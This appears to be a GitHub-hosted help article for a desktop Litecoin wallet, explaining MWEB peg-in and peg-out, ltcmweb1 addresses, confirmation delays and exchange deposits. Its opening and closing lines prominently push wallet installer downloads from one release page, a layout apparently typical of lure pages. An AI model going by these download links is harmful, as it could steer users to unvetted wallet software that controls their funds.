![Lite Wallet](assets/banner-article.png)

# Peg in and peg out of MWEB

In and out of MWEB, addresses and waiting states included.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Pegging in moves Litecoin from an ordinary address into the MWEB extension block, where transactions are confidential. Pegging out moves it back to an ordinary address that every service accepts. Both are ordinary transactions from your side, and both take a confirmation or two.

## The two directions, and why you need both

MWEB coins sit at `ltcmweb1...` addresses. Ordinary coins sit at `ltc1...` addresses. The ledger treats them as separate spaces, so moving between them is a deliberate step, not a setting.

| Direction | Name | When you need it |
|---|---|---|
| ordinary -> MWEB | peg in | you want confidential holding and sending |
| MWEB -> ordinary | peg out | an exchange, a merchant or a service will not accept MWEB |
| MWEB -> MWEB | confidential send | wallet to wallet, both in MWEB |
| ordinary -> ordinary | normal send | the default before MWEB is ever enabled |

The practical rule is that everything outside the wallet - exchanges, payment processors, most shops - expects ordinary addresses. Peg out before you send to a service that has not confirmed it accepts MWEB.

## Pegging in

1. Confirm the wallet is in MWEB mode ([the MWEB guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/does-litewallet-support-mweb.md)).
2. Open the MWEB section and choose peg in.
3. Enter the amount from your ordinary balance.
4. Confirm and sign.
5. Wait for the peg-in transaction to confirm.
6. Check the MWEB balance; it appears after confirmation, not instantly.

Two details are worth knowing before you start. The balance does not move at the moment you press confirm - it moves when the transaction confirms, which is why a "missing" balance is usually just an unconfirmed peg. And a peg-in is a real transaction with a real fee, not a relabelling of coins you already had.

## Pegging out

Pegging out is the step that protects you from the most common MWEB mistake: sending confidential coins to a service that cannot credit them.

1. Choose peg out in the MWEB section.
2. Enter the amount and the destination ordinary address.
3. Confirm and sign.
4. Wait for confirmation, then check that the coins appear at the ordinary balance.
5. Only then send to the exchange or merchant.

Doing it in one hop - MWEB address straight to an exchange deposit address - is what produces stuck deposits. The extra step costs a fee and a few minutes and removes the whole class of problem.

## Reading the `ltcmweb1` address

An `ltcmweb1...` address is what an MWEB receiving address looks like: the same bech32-style prefix scheme, a different human-readable part, and a longer body than an ordinary address. It is not a different chain and not a different coin - it is the same Litecoin, addressed into the extension block.

The address format is also how you tell, at a glance, which space a payment belongs to. If a sender is given an `ltcmweb1` address, the coins arrive in MWEB. If they are given an ordinary address, they arrive on the normal chain.

## Opting in and out of the mode

Enabling or disabling MWEB changes where new money arrives, not where existing money sits. Nothing is converted by the switch, and nothing is lost by turning it off.

| Action | Effect |
|---|---|
| enable MWEB | new deposits arrive at `ltcmweb1...` |
| disable MWEB | new deposits arrive at ordinary addresses |
| existing MWEB balance | unchanged by either switch |
| existing ordinary balance | unchanged by either switch |

That is why turning MWEB off and expecting your MWEB balance to appear as spendable ordinary coins does not work: the coins have to be pegged out.

## Sending MWEB coins to an exchange

Ask the exchange first, in writing, whether it credits deposits from the extension block. If it does not, the failure mode is unpleasant: the transaction confirms on chain, the exchange shows nothing, and support treats it as a missing deposit.

The safe sequence is peg out, confirm, then send to the deposit address. If a deposit has already gone wrong, the coins are not lost - they are at an address the exchange controls - but recovery depends entirely on that exchange's process, which is why the peg-out step is worth the two minutes.

## Recovering an MWEB balance after a restore

The paper key restores the wallet, including its MWEB history, but the balance does not appear until the scan reaches the peg-in transactions. A freshly restored wallet showing zero in the MWEB section is normal.

If the scan has finished and the MWEB balance is still missing while the ordinary balance is correct, the likely cause is a scan that stopped early rather than a lost balance. [The sync troubleshooting guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-stuck-syncing-balance-zero.md) covers that, and [the paper key restore guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/restore-litewallet-from-a-paper-key.md) covers the restore sequence itself.

## Fees, confirmations and timing

A peg is an ordinary transaction, so it has an ordinary fee and an ordinary confirmation wait. The wallet shows both before you confirm, and the amount that moves is the amount you specified minus the fee, exactly as with any send.

The part that catches people is the delay in the balance. Pressing confirm does not move the coins into the MWEB balance; the peg has to be mined first, and until it is, the wallet is entitled to show the old state. A peg that appears to have done nothing for a few minutes has usually done exactly what it should.

Timing follows Litecoin's block schedule, which is short enough that a peg in or out normally settles while you are still looking at the screen. A peg that is still pending after several blocks was priced below the going rate, and the fix is the same as for any stuck send: replace it at a higher rate rather than sending a second peg.

Do not peg the same coins twice to hurry things along. Two pegs of the same balance are two transactions, and if both confirm you have moved twice the amount you intended, in two directions. Waiting is always cheaper than a duplicate.

## FAQ

### What does pegging in mean?

Moving coins from an ordinary Litecoin address into the MWEB extension block so they can be held and sent confidentially. It is a normal on-chain transaction with a normal fee.

### How do I peg out of MWEB?

Choose peg out in the MWEB section, enter the amount and an ordinary destination address, confirm, and wait for confirmation. The coins then appear at your ordinary balance.

### Why does my MWEB balance show zero after a peg in?

Because the peg-in has not confirmed yet. The balance updates when the transaction confirms, not when you sign it.

### Can I send MWEB LTC straight to an exchange?

Usually not. Many exchanges credit only ordinary addresses, so peg out first, confirm, then send. A direct send can confirm on chain while the exchange shows nothing.

### Do I need to opt in again after restoring my wallet?

The restored wallet keeps its MWEB history, but the mode setting may need to be re-enabled before new deposits arrive at an `ltcmweb1` address.

Pegging behaviour is unchanged in the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
